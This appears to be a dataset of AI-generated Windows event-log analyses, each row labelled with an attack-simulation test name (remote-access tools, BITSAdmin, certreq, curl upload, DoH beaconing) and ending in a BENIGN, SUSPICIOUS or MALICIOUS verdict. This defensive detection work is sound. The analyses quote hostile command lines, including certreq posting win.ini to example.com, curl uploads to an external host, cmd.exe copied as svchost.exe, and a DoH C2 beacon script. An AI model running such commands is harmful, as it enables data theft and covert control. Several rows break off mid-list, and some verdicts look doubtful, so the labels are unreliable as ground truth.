   - A PowerShell command was used to download an executable (`GoToAssist.exe`) from an external URL onto the system, indicating potential risks if not properly verified.
   - The command included `Invoke-WebRequest`, a known method for downloading files which can be leveraged for legitimate or malicious purposes. The tool itself appears legitimate (it appears to be related to remote assistance).

3. **Execution of Services and Processes:**
   - There are multiple executions of legitimate Windows processes (e.g., `HOSTNAME.EXE`, `conhost.exe`, `whoami.exe`), indicating normal activity.
   - The execution of `GoToAssist` related processes appears consistent with the use of remote assistance software.

4. **Network and System Integrity:**
   - There are no signs of privilege escalations or the creation of unknown users.
   - The processes maintain integrity levels consistent with user actions and do not show indications of unauthorized privilege escalations.

5. **Edge Update Activity:**
   - Extensive logs are related to Microsoft Edge updates, which appear typical for background system maintenance, with no indicators of subversion or compromise.

**Threat Assessment and Risk:**

- **GoTo Opener and GoToAssist:** These installations likely align with legitimate use for remote support. However, it is crucial to verify if the downloads and installations were initiated by authorized personnel within the organization.
  
- **PowerShell Usage:** Although potentially benign (downloading a GoToAssist installer), the execution of PowerShell scripts, especially those interacting with external networks, should be monitored as they can be exploited in attacks if not properly managed.

**Recommendation:**

- **Verification:** Confirm that the installation of GoTo Opener and GoToAssist, along with the PowerShell activities, were authorized and intended by the IT department or relevant authority within the company.
  
- **Monitoring:** Implement monitoring policies for PowerShell executions and network downloads to ensure that only sanctioned activities occur.

- **Security Measures:** Enhance logging, especially regarding privileged account activities, to detect any unusual use of administrative privileges. Consider tightening security policies around script execution.

**Conclusion:**

The activity in the logs largely supports legitimate remote support tool usage and system updates. The presence of remote assistance-related logs and Microsoft Edge updates does not inherently suggest malicious activity. Nonetheless, verification of authorization is suggested to ensure compliance with corporate policies.

**Resolution: SUSPICIOUS**

The logs contain activities (PowerShell download of executables from the Internet) that warrant further investigation to confirm authorization and intent. While likely benign, it's prudent to verify these actions due to the potential security implications."
Ammyy Admin Software Execution,"Upon analyzing the provided Windows event logs from the host ""Server002,"" several indicators of potentially malicious activity have been identified, particularly involving the use of PowerShell to execute an executable commonly associated with remote desktop and access tools.

### Identified Suspicious Activities:

1. **Use of PowerShell to Launch Executable:**
   - There is a series of Sysmon logs indicating that ""powershell.exe"" was used by the user ""SERVER002\admin_test"" with high integrity level to execute: 
     ```
     ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\ammyy.exe""
     ```
   - The command line arguments provided in these events hint at the execution of ""ammyy.exe,"" which is a known remote administration tool often leveraged for unauthorized remote access.

2. **Event Details from PowerShell Log:**
   - The PowerShell logs (EventID 600) confirm the execution of the above command through PowerShell, evidencing an intent to execute the Ammyy Admin software:
     - Typically noted in malware investigations as an indicator of potential malicious intent, especially when executed without clear administrative consent.

### Analysis and Risks:

- **Potential Unauthorized Remote Access:**
  - The presence of ""ammyy.exe"" being executed without a clear legitimate purpose raises a red flag for potential unauthorized remote control or monitoring of the system.
  
- **Execution from Temp Directory:**
  - The execution of an application from a user's Temp directory, especially one with administrative privileges, is commonly associated with malware activities.

- **Absence of Security Logs:**
  - The lack of security logs might represent an intentional clearing to bypass or cover the tracks, which is suspicious in the context of these other events.

### Resolution:

Given these observations, the activity identified in the logs points to indicators that are typically aligned with malicious behavior, especially seeing that potentially harmful software is being executed without an overt, legitimate purpose.

### Resolution: MALICIOUS

### Recommended Actions:

1. **Immediate Isolation:**
   - Isolate Server002 from the network to prevent any potential spread or unauthorized access.

2. **Comprehensive Malware Scanning:**

UltraViewer - RAT Execution,"Based on the analysis of the provided logs, we can discern the following:

### Suspicious and Anomalous Behavior:
1. **PowerShell Execution:** There are repeated instances of PowerShell being used to start a process involving `data_UltraViewer.exe` with silent arguments, which is characteristic of software being installed or run without user interaction. This behavior is often associated with malicious activity, especially if executed from suspicious directories or initiated silently.
   
2. **Installation of UltraViewer:** Multiple logs indicate the installation and execution of `UltraViewer` related executables, including `UltraViewer_Desktop.exe`, `data_UltraViewer.exe`, and `UltraViewer_Service.exe.` UltraViewer is a remote desktop software and can be used legitimately, but in the context of unusual PowerShell usage and installation from temporary directories, it poses a potential security risk.

3. **Taskkill Usage:** The use of `taskkill.exe` to forcibly terminate processes like `UltraViewer_Desktop.exe` and `UltraViewer_Service.exe` may suggest an attempt to hide activities or disrupt legitimate security processes.

4. **Privilege Escalation:** The logs show elevated privileges being granted to the user `admin_test` with explicit privileges such as `SeDebugPrivilege`, which is particularly powerful and typically reserved for administrative users.
   
5. **Service Installation:** The installation of services like `UltraViewer_Service.exe` set to auto-start is concerning, especially given the context and rapid succession of the events aligning with silent installations.

### Indications of Malicious Activity or Compromise:
The deployment and execution of remote desktop software, especially in a stealthy manner (using PowerShell scripts and silent installation methods), is a red flag. Remote access tools can be employed by malicious actors to maintain access to a system, retrieve sensitive information, or manipulate system settings without the user's knowledge.

### Assessment:
- **Threats Identified:** The potential threat here includes unauthorized remote access, system manipulation, and possible exfiltration of data through remote desktop tools.
- **Risks Identified:** The presence of potentially unwanted remote access software and high-level privileges granted to a user in questionable circumstances introduces high risk. 

### Recommendations:
1. **Immediate Investigation:** Conduct a deeper investigation into who initiated the UltraViewer-related activities, the source of the `data_UltraViewer.exe` file, and the reasons for its execution.
2. **Network Monitoring:** Monitor network traffic for any unusual connections or data exfiltration attempts to/from suspicious IP addresses.
3. **Privilege Audit:** Review and, if necessary, retract elevated privileges from suspicious accounts if unjustified.
4. **Endpoint Protection:** Run a comprehensive security scan to check for additional signs of compromise and ensure endpoint protection software is up to date.

### Final Resolution: 
- **SUSPICIOUS** - The activity appears suspicious with potential for malicious compromise. Further investigation is warranted to determine the legitimacy and intent of the actions observed in these logs."
RemotePC Software Execution,"Upon a thorough analysis of the logs provided, there are several points that warrant attention:

### Suspicious or Anomalous Behavior:
1. **Unusual Process Execution**: 
   - PowerShell is used to execute a file named `RemotePC.exe` from a temporary directory. This is an unconventional location for legitimate software execution and could suggest an attempt to execute potentially malicious software.
   - Multiple instances of processes are being spawned from `RemotePC.exe`, `RPCDownloader.exe`, and other similarly named executables under `C:\Program Files (x86)\RemotePC\`. Although these seem related to a remote desktop software, their execution from a temporary location and references to `RemotePCService.exe` might be unintended.

2. **Service Creation Log**: 
   - A new service named `RPCService` was created pointing to `RemotePCService.exe`. This may indicate persistence mechanisms typical of malware if the software was unauthorized, especially given it is set to start automatically.

3. **Use of `cmd.exe` for System Modifications**: 
   - The use of `cmd.exe` to create services and alter system configurations (`regedit.exe` with suspicious command line options) are activities often associated with unauthorized system modifications or malware activity.

4. **Task Kill and Service Management Commands**: 
   - Using `taskkill` to forcibly terminate processes like `RemotePCUIU.exe` suggests an attempt to manipulate or corrupt running processes, which can be indicative of malware trying to terminate protective or competing processes.

5. **Registry Modifications via PowerShell**:
   - Registry modifications are executed via PowerShell without explicit user interaction, which can be aggression pointing towards stealth modifications exploited by malware.

### Assessment:
While these logs could potentially be legitimate activities associated with enterprise remote management or deployment solutions, the behaviors observed (including execution from temporary directories, registry modifications, automatic service initiation, and multiple process instances in quick succession) align with known indicators of adversarial tactics, specifically for persistence and stealth.

### Recommendation:
- **Resolution**: **SUSPICIOUS**
- **Action Items**:
  - Verify the legitimacy of the `RemotePC.exe`, `RPCService`, and associated executables with your application whitelist.
  - Conduct a complete malware scan focusing on the timeline identified in the logs.
  - Review network activity associated with the identified processes to check for unusual outbound connections.
  - Initiate an immediate incident response if these activities are not accounted for in enterprise software deployments.

Further investigation into the nature of these processes and verification against known software installations is strongly recommended to either ratify or dismiss these activities as benign."
Testing usage of uncommonly used port with PowerShell,"Based on the analysis of the provided Windows event logs, here is a summary of findings:

### Notable Events and Analysis:

1. **Logon Events:**
   - EventID 4624 represents successful logins on the system. The logins are using the SYSTEM account with LogonType 5 (service), which is typical for system services starting and not immediately suspicious.

2. **Privilege Assignment:**
   - EventID 4672 indicates special privileges assigned to the SYSTEM account, which includes higher privileges required by services for routine operations. This is normal for many service accounts but is worth monitoring for any unexpected behavior.

3. **User Enumeration:**
   - EventID 4798 involves enumerating a list of local users via ""taskhostw.exe,"" which can be suspicious if unauthorized but is not definitively malicious on its own.
   - Several events indicate enumeration of users such as ""Administrator,"" ""admin_test,"" ""Guest,"" ""DefaultAccount,"" and ""lplui."" If these operations were unexpected or there is no justification, further investigation is needed.

4. **Credential Events:**
   - EventID 5379 indicates failed credential validation attempts for MicrosoftAccount:user and WindowsLive services. The status code suggests invalid authentication, which might be concerning if these correspond to failed logins due to unauthorized use.

5. **Windows PowerShell Activities:**
   - Event logs show PowerShell execution with a command targeting external connectivity (`Test-NetConnection` to `google.com`). Monitoring external requests through PowerShell is crucial, but this command doesn't inherently indicate maliciousness unless run in an unexpected context.

6. **Sysmon Events:**
   - Multiple instances of process execution logs for tasks such as `wevtutil.exe`, `conhost.exe`, and `taskhostw.exe` influenced by `admin_test` or `NT AUTHORITY\SYSTEM` users. The use of administrative account or SYSTEM performing these tasks can be standard depending on the tasks being executed, yet unusual command-line arguments can suggest further review.

7. **Miscellaneous Observations:**
   - Frequent execution and scheduled tasks associated with Microsoft Edge Update with commands referencing `/svc`, `/regsvc`, `/regserver`, which align with expected behavior of Edge updates management but could represent a potential attack vector if misused.
   - Telemetry and Windows Update related processes (e.g., `CompatTelRunner.exe`, `UsoClient.exe`) appeared, mostly consistent with background tasks expected for Windows Maintenance.

### Assessment:
Based on the current evidence:

- **SUSPICIOUS** activity detected, primarily due to repeated user enumeration and PowerShell network probing. While no concrete evidence of compromise was found, these actions warrant further investigation, especially in contexts where they are unexpected or unauthorized.

### Recommendations:
- **Investigate User Enumeration**: Verify whether user enumeration operations and account accesses align with typical operations on this server. Review the ""admin_test"" account usage and any documented activities carrying out these tasks.
- **Review PowerShell Usage**: Check the necessity of PowerShell executions targeting external connections and ensure they are in line with standard operating procedures or scripts.
- **Monitor Credential Validation**: Examine authentication errors and alerts for any indications of unauthorized access attempts via Microsoft account services.
- **Log Access and Incident Review**: Reinforce logging and review logs to catch unauthorized access or privilege escalations early.

Finalize these actions on logs consultation with respective stakeholders within the organization."
UltraVNC Execution,"After analyzing the provided Windows event logs, several indicators raise concern regarding potential malicious activity on the host:

1. **Execution of Setpasswd.exe**:
   - The execution of `setpasswd.exe` from `C:\\Program Files\\uvnc bvba\\UltraVNC` is notable as it involves credential management. This program is related to UltraVNC which can be used for remote desktop access and may indicate the setup or alteration of remote access capabilities.

2. **Firewall Rule Modifications**:
   - Multiple executions of `netsh.exe` to add firewall rules for ports 5900 and 5800, which are commonly used for VNC connections, as well as adding `winvnc.exe` and `vncviewer.exe` as allowed programs, suggest attempts to configure or adjust remote access settings, further cementing the suspicion around remote desktop activities.

3. **Unusual PowerShell Activity**:
   - PowerShell scripts executing command lines like `Start-Process` to invoke VNC viewer directly implies automated or script-driven initiation of remote sessions. This, combined with associated changes in firewall rules, could indicate an effort to establish or augment remote administration access covertly.

4. **Process Execution without Typical Parent**:
   - Several process executions, like those of `CMD.EXE`, `netsh.exe`, and `ps.exe`, occur without typical parent processes (as indicated by the `ParentProcessGuid` being null), potentially indicating manual launching outside of usual application workflows.

5. **Modifications to Security Settings or Credentials**:
   - Possible credential or security configuration changes via `setcad.exe` also noted, especially under high-integrity contexts, which could suggest unauthorized administrative changes.

6. **Script Installation and Execution**:
   - The presence of files and temporary executables in the `Temp` folder and attempts to execute setup or installation routines silently (`vncsetup.tmp`) highlight possible stealthy deployment of applications or scripts for maintaining access or conducting further actions.

Given these indicators, activities within the logs strongly suggest preparation or establishment of unauthorized remote access and potential tampering with system security configurations. The observed behaviors are consistent with typical steps taken by threat actors when setting up persistent remote access or attempting lateral movement on a networked system.

**Assessment**: MALICIOUS

**Resolution**:
1. **Immediate Containment**: Disconnect the affected host from the network to prevent potential lateral movement or data exfiltration.
2. **Investigate Further**: Conduct deeper forensics on the host to trace back the source of the activity, including reviewing additional system logs, installed software, and network connections.
3. **Remediation**: Remove unauthorized applications and any associated configurations. Review firewall rules for unnecessary exceptions, and ensure security settings are standardized and enforced.
4. **Monitor Closely**: Implement enhanced monitoring across the network to detect similar patterns that could suggest other affected systems.
5. **User Awareness Training**: To prevent future incidents, consider training sessions focusing on recognition of potential threats and safe computing practices."
Psiphon,"Upon reviewing the provided logs, let's go through the different sections:

### Application Log:
- The logs indicate normal system activities such as the starting of the Software Protection Platform Service and Windows Defender Security Center with a status of `SECURITY_PRODUCT_STATE_ON`. There are no malicious indicators in this section.

### Sysmon Log:
- A series of process creation events is observed, which includes the execution of typical system processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and `HOSTNAME.EXE`. These processes are running under the `SERVER002\admin_test` account, which is displaying a consistent pattern.
- There is a particular entry where `powershell.exe` is executing a batch script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\script.bat`. This location could potentially be suspicious since arbitrary scripts from the Temp directory indicate an execution of scripts that might not be part of standard operating procedures.
- Additionally, `cmd.exe` is used to execute the script (`script.bat`) which confirms the execution.
- Regular system updates are apparent with the presence of `MicrosoftEdgeUpdate.exe` and Edge installer activities, which suggest the normal update processing of Microsoft Edge.
  
### Security Log:
- Typical logon events for the system account `SYSTEM` and the user `admin_test` are highlighted, with no unusual logon types or external accesses besides the local system accesses.
- Privileges like `SeDebugPrivilege` and others are granted to the `admin_test` account, which is a normal occurrence for administrative-level accounts.
  
### PowerShell Log:
- The execution of the `powershell.exe` with the script from the Temp directory indicates that `powershell.exe` was invoked to run specific commands contained in that batch file. There is no direct evidence of what the script contains or performs from the logs themselves, but this is flagged due to being sourced from a potentially non-standard directory.

### Conclusion:
The logs indicate lots of typical system and administrative activities. However, the execution of PowerShell using a script located in the temporary directory raises a flag as it could potentially indicate the execution of non-standard or unauthorized scripts depending on company policy.

### Resolution:
Given the observations:
- **SUSPICIOUS** - The PowerShell activity involving the script file from the temporary folder suggests there could be more investigation needed to determine the legitimacy and purpose of the script involved. Further analysis on the specific script's content or associated network or system behaviors is advised for complete assurance."
svchost writing a file to a UNC path,"## Analysis

The provided logs from the Windows machine reveal several events that warrant closer scrutiny due to potential risk indicators. A detailed analysis can categorize these activities as either routine or signals of possible malicious activity. Let's evaluate key log entries:

### Sysmon Logs

1. **Command Execution Events**:
   - Multiple instances of `C:\Windows\System32\cmd.exe` are recorded. The command `cmd.exe /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo data > \\localhost\c$\data.txt` indicates suspicious behavior. Replicating system binaries like `cmd.exe` under different names could be an attempt to masquerade malicious processes. Additionally, writing to `\\localhost\c$` might denote data staging for exfiltration.

2. **Process Anomalies**:
   - The execution of `C:\Windows\System32\wevtutil.exe`, `conhost.exe`, and other system commands by `SERVER002\admin_test` could be part of administrative tasks. However, this activity requires validation to ensure it aligns with expected behavior for this user account.

3. **High-Integrity-Level Processes**:
   - Several processes, including `HOSTNAME.EXE` and `whoami.exe`, are executed at a high integrity level by `SERVER002\admin_test`. Their presence alone is not malicious but indicates actions that may require privileged access.

### Security Logs

1. **Privileged Access**:
   - Logon event 4672 indicates the user `admin_test` acquiring special privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, granted typically for administrative purposes. Attention should be given to whether such privileges are essential and valid for this user account amid suspicious activity.

2. **Successful Logons / Logoffs**:
   - Event 4624 records successful logons by `admin_test` using NTLM authentication, which in itself isn't unusual but might offer insights if linked to suspicious behavioral patterns in other logs.

### Application Logs

- Entries regarding Edge updates (`edgeupdate` service stopped) seem benign and part of routine background updates unless traced back to anomalous processes from Sysmon Logs.

### Additional Insights

- **Time Synchronization Anomalies**:
   - The system and security logs indicate a backtrack in system time. This might entail manual adjustments or network synchronization issues but could also signal an attempt at log tampering—though this alone isn't definitive of malicious intent without corroborated suspicious activity.

## Assessment

The logs contain actions that can be deemed SUSPICIOUS due to unusual command executions, privilege escalations, and time adjustments not typical in standard operational tasks. The critical command-line operations indicate possible unauthorized copying and execution of system binaries in non-standard ways.

## Resolution

- **Resolution**: **SUSPICIOUS**
  
## Guidance

- **Investigate Further**: Look deeper into `admin_test` account activities to validate the legitimacy of executed commands. Confirm whether the copying of `cmd.exe` aligns with legitimate activities.
- **Review Privileges**: Audit and potentially restrict elevated privileges granted to accounts, ensuring they comply with job roles.
- **Log Correlation**: Correlate these findings with any related network traffic logs or intrusion detection alerts for comprehensive security insights.
- **Monitor and Adjust**: Implement monitoring for any additional instances of similar command-line executions and privilege assignments to pre-empt future malicious activities. 

This analysis points towards the need for further inquiry to conclusively determine whether these activities are benign, suspicious, or definitively malicious."
Download a File with Windows Defender MpCmdRun.exe,"Based on the analysis of the provided Windows event logs, here is a detailed assessment of the situation:

### Observations:

1. **System Logs**:
   - There are events related to time synchronization and time changes. This might indicate normal time synchronization activities if the server is configured to sync time with an NTP server.

2. **Security Logs**:
   - Logon events show SYSTEM and Local Service account activities, mainly related to scheduled tasks or system services. These activities appear normal for system processes.
   - Event ID 4624 shows a successful logon of the SYSTEM account via a service, which is a typical logon type for automated service activities.

3. **Sysmon Logs**:
   - Command Prompt (cmd.exe), Console Window Host (conhost.exe), and Microsoft Edge Update processes are observed. 
   - The command line for cmd.exe shows an interaction with Windows Defender, which seems to be querying its command-line tool (MpCmdRun.exe) for usage info. This could be seen during routine checks or updates.
   - Multiple instances of wevtutil.exe are observed, often used to manage Windows Event logs—could indicate automated maintenance or logging activities.
   - The bulk of the entries relate to Microsoft Edge Update processes updating the software on the system, consistent with legitimate software update activities.

4. **Application Logs**:
   - Logs indicate Windows Defender is continuously active and running, suggesting the system has active virus protection.
   - Log entries from edgeupdate pertain to stopping services, which aligns with the update activities seen within the sysmon logs.

### Analysis:

- **Suspicious Indicators**: 
  - There is no direct evidence of privilege escalation, system exploitation, or unauthorized access.
  - The repeated invocation of the `wevtutil.exe` process could suggest log manipulation or clearing attempts; however, there is no further evidence in logs to corroborate this as malicious.

- **Malicious Indicators**: 
  - No definitive signs of malicious software or modification of system files are evident.
  - The network service accounts and SYSTEM operations appear to be performing standard updates, time synchronization, and possibly some maintenance tasks.

### Conclusion:

The logs do not explicitly indicate any malicious activities. The operations noted are, for the most part, benign, involving time synchronization, authorized logins, and software updates (specifically Microsoft Edge Update processes). The execution of system utilities like `cmd.exe`, `wevtutil.exe`, and Windows Defender capabilities appear to be routine maintenance or update checks.

### Resolution:

**BENIGN** - The logs suggest normal system and application operations without clear indicators of compromise or malicious activity. However, if there is a lack of context, such as why the `wevtutil.exe` was invoked multiple times, it might warrant some additional verification with system owners or administrators to rule out automated clearing or manipulation of logs outside normal procedures."
DNS over HTTPS Regular Beaconing,"Upon analysis of the provided logs, the following observations and assessments have been made:

### Application Log
- The event associated with the Software Protection Platform Service does not present any immediate cause for concern. It seems to belong to routine software protection checks.

### Sysmon Log
- Multiple instances of `wevtutil.exe` and `conhost.exe` processes are observed. These processes can be legitimate but may also correlate with suspicious activities depending on the context. However, without further supporting evidence, their occurrence alone isn't strongly indicative of malice.
- The presence of `hostname.exe` and `whoami.exe` executed by `admin_test` are generally benign as these commands are commonly used for diagnostic purposes.
- The critical point of concern is the execution of `powershell.exe` with a suspicious command line which involves running a script (`data-doh-beacon.ps1`) with parameters that suggest potential data exfiltration or command-and-control (C2) activity using DNS over HTTPS. This activity is notably suspicious:
  - **Command:** `Set-Location ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file"" , .\\data\\src\\data-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain file -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30`
  - Running this script could potentially facilitate C2 communication using DNS queries as likely indicated by parameters such as `-DohServer`, `-Domain`, `-Subdomain`, `-QueryType`, etc.

### Security Log
- Events show that the user `admin_test` has logged in with NTLM authentication from the workstation `DESKTOP-3HL5B2P` and has been provided with elevated privileges. The provision of privileges like `SeDebugPrivilege` and `SeBackupPrivilege` denotes high permissions which in combination with the suspicious PowerShell activity could lead to potential compromise or lateral movement.

### Windows PowerShell Log
- The PowerShell activity confirms the execution of the suspicious script (`data-doh-beacon.ps1`). This script and its parameters, as logged, are typically not associated with regular user activity and suggest malicious intent, particularly if it relates to data exfiltration or external C2 operations.

### System Log
- No particular anomalies were detected that directly indicate malice, but synchronization of time services and the nature of both legitimate and suspicious activities occurring concurrently suggest possible tactic alignments by a potential adversary.

### Assessment
Overall, the logs present a strong indication of suspicious behavior that requires immediate attention and further investigation. Particularly, the PowerShell command with the script `data-doh-beacon.ps1` is suspicious and possibly linked to malicious activities like data exfiltration or unauthorized communications.

### Resolution
- **Resolution:** MALICIOUS
- **Guidance:** Given the context and gathered evidence:
  1. Quarantine the host (`Server002`) to prevent further potential data leak or adversarial access.

Immediate action is crucial to mitigate any active threat."
certreq download,"Upon evaluating the provided Windows event logs, here is a detailed analysis of the entries with any indicators of suspicious behavior or potential compromise:

1. **Process Execution Patterns**
   - There is frequent execution of processes like `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While these processes themselves are not inherently malicious, they can be used in suspicious activities:
     - `wevtutil.exe` is used for event log management, and its repeated execution with `admin_test` user context could indicate attempts to access or clear event logs.
     - The command line in one instance of `cmd.exe`: `certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\\file-license.txt`, is highly suspicious. This indicates uploading a request to an external server, which could be a potential data exfiltration attempt or unauthorized network communication.
  
2. **Privilege Escalation**
   - The Security logs (event ID 4672) indicate that the `admin_test` user has special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and others that are typically needed to perform administrative tasks. This is not inherently malicious but combined with suspicious command lines, it's worth noting.

3. **Network and External Connections**
   - The presence of external connections using 'certreq.exe' to `https://example.com` suggests unauthorized network activity potentially for malicious purposes.

4. **System Update Activities**
   - The logs show activities related to Microsoft Edge updates and installations. These activities appear legitimate and consistent with software update mechanisms. However, they create noise that can obfuscate malicious activity.

5. **Benign Activities**
   - Many Sysmon logs detail processes like system utilities running under `NT AUTHORITY\SYSTEM`, which are normal and expected for Windows maintenance and updates.

**Assessment:**
The user activity, especially around `wevtutil.exe` and `cmd.exe` using `certreq.exe` to post requests to an external URL, is suspicious. The logs should be closely investigated for unauthorized file transfers, system modifications, or further connections to external networks.

**Resolution: SUSPICIOUS**
The noted activities need more investigation to determine if they were authorized actions or indicative of compromised user credentials. Immediate focus should be on investigating network traffic linked to the suspicious command line activity and any unusual file changes or access. Additionally, ensure logging and monitoring are enabled to capture potential further activity by the `admin_test` user."
Windows - BITSAdmin BITS Download,"Upon analyzing the provided event logs from the Windows machine ""Server002"", certain patterns emerge which warrant a detailed examination:

### Windows Security Logs
- **Event ID 4616**: This event indicates that the system time was changed by a process. This can either be a benign action or suspicious if unauthorized. The change here was managed by `svchost.exe`, which is a legitimate Windows process often used by malicious actors to conceal their actions.

### Sysmon Logs
- **Sysmon Event ID 1 (Process Creation)**: A whoami command and hostname command were executed at high integrity levels from the `admin_test` user account. These commands are generally harmless but used in enumeration activities.
- **Sysmon Event ID 1 (Process Creation)**: A `cmd.exe` process with a suspicious command line executed `bitsadmin.exe` to download a file from an external URL (GitHub). The use of `bitsadmin.exe` indicates potential malicious activity because it is sometimes used by attackers for stealthy network communication and file downloads.
  
### Application and System Logs
- Various application logs indicate routine activities, such as Edge update processes and standard services starting and stopping.

### Conclusion
The activity involving the use of `bitsadmin.exe` is particularly concerning. Although `bitsadmin.exe` is a legitimate tool, it is often leveraged by attackers to download potentially malicious payloads stealthily. The downloading from GitHub and the manipulation of command line arguments in this manner is indicative of a potential compromise or malicious attempt.

### Assessment
- **SUSPICIOUS**: The presence of `bitsadmin.exe` downloading a file warrants further investigation, especially the context and intention behind it, as it could be indicative of malicious intent. Further examination of the downloaded file and its behavior should be conducted. In parallel, ensure that the `admin_test` account and any related access permissions are scrutinized for unusual activities or changes.

### Guidance on How to Proceed
- Isolate the machine from the network to prevent any potential threat from spreading.
- Conduct a thorough investigation of the downloaded file and the URLs involved.
- Review recent activities of the `admin_test` user and monitor any unusual behaviors or accesses.
- Verify system integrity and seek indicators of further compromise.
- Consider an endpoint detection and response (EDR) solution to gain detailed insight into activities on host systems."
MSP360 Connect Execution,"### Log Analysis

#### Windows PowerShell Log:
- **Command Line:** The logs show repeated entries where PowerShell is executed with the command line `powershell.exe & {Start-Process $env:ProgramFiles\\Connect\\Connect.exe}`.
- **Observation:** The use of PowerShell to execute another process (`Connect.exe`) is noted. This type of behavior can occasionally be seen in legitimate administrative or scripting tasks. However, it also aligns with common techniques used in malicious activities, such as executing a payload or backdoor.

#### Sysmon Log:
- **Process Execution:** Multiple processes are being executed under the `SERVER002\admin_test` user account:
  - Repeated execution of `wevtutil.exe`, `conhost.exe`, and specifically PowerShell.
  - `whoami.exe` was executed typically used for checking the current user identity.
  - Many processes related to Microsoft Edge Update, such as `MicrosoftEdgeUpdate.exe` and others, which could imply a legitimate update process.
- **Observation:** The environment details reveal high integrity level execution, indicating administrative access was likely used. Frequent process creation with PowerShell could suggest scripting or potentially malicious scripting activity.

#### Application Log:
- The entries related to `edgeupdate` suggest that Microsoft Edge was being updated or its services were stopped and potentially restarted. Such events can be benign, aligned with regular software updates.

### Assessment

Based on the available log data:
- **Benign Indicators:**
  - The Microsoft Edge Update processes and events seem aligned with routine updates and do not exhibit malicious characteristics unless other indicators are present elsewhere.

- **Suspicious Indicators:**
  - The use of PowerShell to start another executable (`Connect.exe`) combined with its high-integrity level execution and process spawning under admin privileges is suspicious. PowerShell is a powerful tool often exploited for lateral movement and code execution in environments.
  - There is a lack of context regarding what `Connect.exe` is and if it should be running within this environment, which raises concerns.

- **Anomalies:**
  - Multiple entries for `wevtutil.exe` and checking of user identity using `whoami.exe`, might align with activity attempting to gather system information or prepare for further actions.

### Resolution: **SUSPICIOUS**

Despite not having definitive malicious activity, the execution of PowerShell commands with unknown processes (`Connect.exe`) is concerning enough to warrant further investigation. 

### Recommendations:
1. **Verify `Connect.exe`:** Investigate the legitimacy of the `Connect.exe` application and its purpose in the network. Check its origin and whether it is expected in the operating environment.
2. **Audit PowerShell Activity:** Review logs for additional PowerShell commands executed on `Server002` to verify against expected administrative activities.
3. **Access Review:** Validate the actions performed by the user `admin_test` and verify if those align with their job roles and responsibilities.
4. **Endpoint Security:** Ensure endpoint protection solutions are enabled and up-to-date to detect any malicious activities tied to these processes.
5. **Exclude Normal Updates:** Confirm that the Microsoft Edge update processes were legitimate by cross-referencing the schedule and logs with the known update cycles.

Continuing investigations are advised to ensure the environment's integrity and to dismiss or confirm any potential threats."
Curl Upload File,"Upon reviewing the provided Windows event logs, several observations can be made regarding potentially suspicious or malicious activity:

1. **Command Execution with curl via cmd.exe:**
   - We observe multiple instances where `cmd.exe` is used to execute `curl.exe` commands to upload a file (`filetestfile.txt`) to a remote server (`www.example.com`). The command line used is quite detailed and consists of several variations of the command, potentially indicating a script or automated process. The repeated use of `curl` for file transfers to an external domain is suspicious, especially in a server environment, and could be indicative of data exfiltration.

2. **Use of PowerShell:**
   - PowerShell is a powerful script engine often used for malicious purposes such as privilege escalation, lateral movement, or executing arbitrary code. In this scenario, there is an event indicating the execution of `powershell.exe`, but the lack of detailed command-line arguments in the provided logs prevents a definitive conclusion regarding its intent. However, it is worth noting that PowerShell usage deserves closer scrutiny in security investigations.

3. **Sysmon Logs - Process Creation and Termination:**
   - The logs contain numerous entries for process creations involving legitimate system executables like `whoami.exe`, `cmd.exe`, and `conhost.exe`. While these alone are not directly indicative of malicious activity, if viewed in conjunction with suspicious command-line parameters or unusual context, they may warrant further investigation.
   
4. **Edge Update Activities:**
   - There are many entries related to `MicrosoftEdgeUpdate.exe`, which are expected as part of regular system update processes. Without additional evidence of tampering or misuse, these events by themselves are considered benign.

Conclusion:
- **SUSPICIOUS:** The presence of `curl.exe` executing multiple file upload commands to an external server is the primary reason for classifying these logs as suspicious. This activity requires further investigation to determine the legitimacy of the file transfers, the contents being transferred, and whether the destination server is known and trusted. Additionally, reviewing system configurations for any unauthorized scripts or scheduled tasks involving these commands would be prudent.
- **Guidance:** Immediate investigation to determine the source and intent of the file transfers, validation with system administrators on authorized use of `curl`, and scanning the system for malware or unauthorized scripts. It may also be prudent to check network logs for data transfers matching these times to correlate activity."
Splashtop Streamer Execution,"Upon careful analysis of the provided Windows event logs, particularly the Sysmon and Windows PowerShell logs, a few areas of note are:

1. **Frequent Execution of System Utilities:**
   - **PowerShell Execution (EventID 5 and 1)**: 
     - The logs show multiple instances of PowerShell executions, notably by `admin_test`. PowerShell is commonly misused in attacks due to its powerful scripting capabilities and is a potential indicator of malicious activity.
     - Specific command: `\""powershell.exe\"" & {Start-Process -FilePath \""C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRServer.exe\""}`. The execution of a remote access tool or server process via PowerShell is suspicious and potentially malicious.

2. **Use of `wevtutil`:**
   - Several instances of `wevtutil.exe` are seen in the logs. This utility is typically used for exporting, archiving, or clearing event logs. Attackers may use this to clear logs post-compromise to hide their tracks.

3. **Other Executed Utilities:**
   - `whoami.exe` and `hostname.exe` are recorded. While these are benign on their own, when used together with other suspicious activities, they can suggest information gathering or reconnaissance.

4. **High Integrity Level:**
   - The processes are executed with a high integrity level, indicating elevated privileges, likely running with administrator rights. This may be acceptable if performed by a legitimate admin user but is suspicious if there's no context for such actions.

5. **Absence of Standard Logs:**
   - The absence or lack of detailed entries in System, Application, and Security logs could suggest log tampering or clearing, which is consistent with the use of `wevtutil`.

**Assessment:**
Given the frequent and simultaneous execution of native Windows tools, initiation of a remote server process through PowerShell, and potential log file manipulation using `wevtutil`, these logs raise significant concerns about possible malicious activity.

**Resolution:**
- **MALICIOUS**: The combination of actions and the presence of remote server process execution via PowerShell strongly indicates malicious activity.

**Guidance on How to Proceed:**
1. **Isolate the Host**: Immediately isolate the affected host to prevent further potential exfiltration or lateral movement within the network.
